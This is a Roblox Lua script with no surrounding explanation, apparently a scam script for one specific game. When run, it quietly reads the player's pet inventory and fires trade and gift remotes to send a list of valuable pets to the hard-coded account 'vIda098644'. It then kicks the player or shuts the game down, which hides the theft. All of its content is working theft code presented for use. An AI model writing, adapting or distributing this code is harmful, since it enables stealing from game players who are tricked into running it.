local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local targetPlayerName = "vIda098644"
local petsToTransfer = {
    "Dragonfly",
    "Raccoon",
    "Mimic Octopus",
    "Kitsune",
    "Corrupted Kitsune",
    "Red Fox",
    "Butterfly",
    "Disco Bee",
    "Queen Bee",
    "Trex",
    "Spinosaurus"
}

local function findRemote(name)
    local locations = {
        Workspace.__REMOTES.Game,
        ReplicatedStorage,
        Workspace.__REMOTES,
        ReplicatedStorage:FindFirstChild("Game")
    }
    for _, location in ipairs(locations) do
        if location and location:FindFirstChild(name) then
            return location[name]
        end
    end
    return nil
end

local function getInventory()
    local inventoryRemotes = {"Inventory", "Pets", "GetInventory", "PlayerData"}
    local inventory
    for _, remoteName in ipairs(inventoryRemotes) do
        local remote = findRemote(remoteName)
        if remote then
            local success, result = pcall(function()
                return remote:InvokeServer("GetInventory")
            end)
            if success and result then
                inventory = result
                break
            end
        end
    end
    return inventory
end

local function transferPets()
    local inventory = getInventory()
    if not inventory then
        return
    end

    local tradeRemotes = {"Trade", "Gift", "SendGift", "TradePet"}
    local tradeRemote
    for _, remoteName in ipairs(tradeRemotes) do
        tradeRemote = findRemote(remoteName)
        if tradeRemote then
            break
        end
    end
    if not tradeRemote then
        return
    end

    local petsFound = {}
    for _, petName in ipairs(petsToTransfer) do
        for _, pet in ipairs(inventory) do
            local petNameCheck = type(pet) == "table" and pet.Name or pet
            if petNameCheck == petName then
                table.insert(petsFound, pet)
            end
        end
    end

    for _, pet in ipairs(petsFound) do
        local petName = type(pet) == "table" and pet.Name or pet
        pcall(function()
            tradeRemote:FireServer("SendGift", targetPlayerName, pet)
            tradeRemote:FireServer("TradePet", targetPlayerName, pet)
            tradeRemote:FireServer(pet, targetPlayerName)
            tradeRemote:FireServer("Gift", {Target=targetPlayerName, Pet=pet})
        end)
    end
end

local function kickPlayer()
    local kickRemotes = {"KickPlayer", "Admin", "Kick", "Disconnect"}
    local kickRemote
    for _, remoteName in ipairs(kickRemotes) do
        kickRemote = findRemote(remoteName)
        if kickRemote then
            break
        end
    end
    if kickRemote then
        pcall(function()
            kickRemote:FireServer(player, "você foi expulso")
            kickRemote:FireServer("você foi expulso")
        end)
    else
        pcall(function()
            game:Shutdown()
        end)
    end
end

local function main()
    if game.PlaceId ~= 126884695634066 then
        return
    end
    transferPets()
    wait(1)
    kickPlayer()
end

pcall(main)
